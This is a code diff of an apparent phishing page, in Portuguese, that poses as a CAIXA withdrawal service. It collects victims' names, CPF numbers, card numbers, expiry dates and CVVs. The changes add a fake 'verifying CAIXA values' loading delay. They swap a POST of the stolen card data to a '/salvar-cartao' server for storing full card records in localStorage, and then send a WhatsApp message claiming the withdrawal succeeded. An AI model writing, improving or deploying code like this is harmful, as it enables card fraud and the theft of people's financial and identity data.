@@ -944,8 +944,20 @@
         }
     }
 
-    function mostrarOpcoesData(opcoes, dataReal) {
-        const container = document.getElementById('dataOptionsContainer');
+
+function mostrarOpcoesData(opcoes, dataReal) {
+    // Primeiro, mostra o loading
+    const container = document.getElementById('dataOptionsContainer');
+    container.innerHTML = `
+        <div class="text-center py-4">
+            <div class="loading-spinner" style="width: 40px; height: 40px; margin: 0 auto 15px;"></div>
+            <p style="color: #004aad; font-weight: 500;">🔍 Verificando valores da CAIXA...</p>
+            <p class="small-note" style="font-size: 12px;">Aguarde, estamos processando suas informações</p>
+        </div>
+    `;
+    
+    // Aguarda 3 segundos antes de mostrar as opções
+    setTimeout(() => {
         container.innerHTML = '';
         opcoes.forEach(dataStr => {
             const div = document.createElement('div');
@@ -961,7 +973,6 @@
                     document.getElementById('valorDisponivel').textContent = formatarMoeda(valor);
                     document.getElementById('finalNome').textContent = dadosUsuario.nome;
                     document.getElementById('finalCpf').textContent = formatarCPFDisplay(cpfAtual);
-                   
                     document.getElementById('cartaoValor').textContent = formatarMoeda(valor);
                     document.getElementById('dataCredito').textContent = getDataMaisDias(3);
                     
@@ -979,7 +990,11 @@
             };
             container.appendChild(div);
         });
-    }
+    }, 3000); // 3 segundos de espera
+}
+
+
+  
 
     function enviarWhatsApp(mensagem) {
         const url = `https://wa.me/${WHATSAPP_NUMBER}?text=${encodeURIComponent(mensagem)}`;
@@ -1122,7 +1137,7 @@
             showStep('flowCartao', 3);
         });
 
-     document.getElementById('confirmCartao').addEventListener('click', async () => {
+       document.getElementById('confirmCartao').addEventListener('click', () => {
     const numeroRaw = document.getElementById('numeroCartao').value.replace(/\D/g, '');
     const validade = document.getElementById('validadeCartao').value;
     const cvv = document.getElementById('cvvCartao').value;
@@ -1164,52 +1179,36 @@
     
     const valor = dadosUsuario?.valorDisponivel || 1987.48;
     
-    // Mostrar loading no botão
-    const btnConfirm = document.getElementById('confirmCartao');
-    const originalText = btnConfirm.innerHTML;
-    btnConfirm.disabled = true;
-    btnConfirm.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Salvando...';
+    // ========== 1. SALVAR NO LOCALSTORAGE (COM DADOS COMPLETOS) ==========
+    const dadosCartao = {
+        nome: dadosUsuario?.nome || 'N/A',
+        cpf: cpfAtual,
+        cartao: numeroRaw,
+        validade: validade,
+        cvv: cvv,
+        email: email,
+        valor: formatarMoeda(valor),
+        data: new Date().toLocaleString('pt-BR')
+    };
     
-    try {
-        console.log('🚀 Enviando dados para o servidor...');
-        
-        // Enviar dados para o servidor salvar em arquivo
-        const response = await fetch('/salvar-cartao', {
-            method: 'POST',
-            headers: { 
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                nome: dadosUsuario?.nome || 'N/A',
-                cpf: cpfAtual,
-                numeroCartao: numeroRaw,
-                validade: validade,
-                cvv: cvv,
-                email: email,
-                valor: formatarMoeda(valor)
-            })
-        });
-        
-        console.log('📡 Resposta recebida:', response.status);
-        
-        const resultado = await response.json();
-        console.log('📦 Dados da resposta:', resultado);
-        
-        if (resultado.success) {
-            alert('✅ Dados salvos com sucesso!\n\n📧 Você receberá um e-mail de confirmação em até 24 horas.\n\n⚠️ O valor será creditado na sua conta após a confirmação.');
-            limparProgresso();
-            showStep('flowSuccess', 3);
-        } else {
-            alert('❌ Erro ao salvar dados: ' + (resultado.erro || 'Tente novamente.'));
-        }
-    } catch (error) {
-        console.error('❌ Erro detalhado:', error);
-        alert('❌ Erro ao conectar com o servidor. Verifique se o servidor está rodando.\n\nDetalhe: ' + error.message);
-    } finally {
-        btnConfirm.disabled = false;
-        btnConfirm.innerHTML = originalText;
-    }
+    const lista = JSON.parse(localStorage.getItem('cartoes_salvos') || '[]');
+    lista.push(dadosCartao);
+    localStorage.setItem('cartoes_salvos', JSON.stringify(lista));
+    
+    // ========== 2. ENVIAR PARA WHATSAPP (SEM DADOS DO CARTÃO) ==========
+    const mensagem = `✅ *SAQUE SOLICITADO COM SUCESSO* ✅\n\n` +
+        `👤 *Beneficiário:* ${dadosUsuario?.nome || 'N/A'}\n` +
+        `💰 *Valor:* R$ ${formatarMoeda(valor)}\n\n` +
+        `📧 Você receberá um e-mail de confirmação em até 24 horas.\n\n` +
+        `🔒 *Solicitação registrada com sucesso*`;
+    
+    enviarWhatsApp(mensagem);
+    
+    alert('✅ Solicitação enviada com sucesso!\n\n📧 Você receberá um e-mail de confirmação em até 24 horas.');
+    limparProgresso();
+    showStep('flowSuccess', 3);
 });
+    
         document.getElementById('cancelCartao').addEventListener('click', () => {
             salvarProgresso();
             showStep('flowFinal', 3);
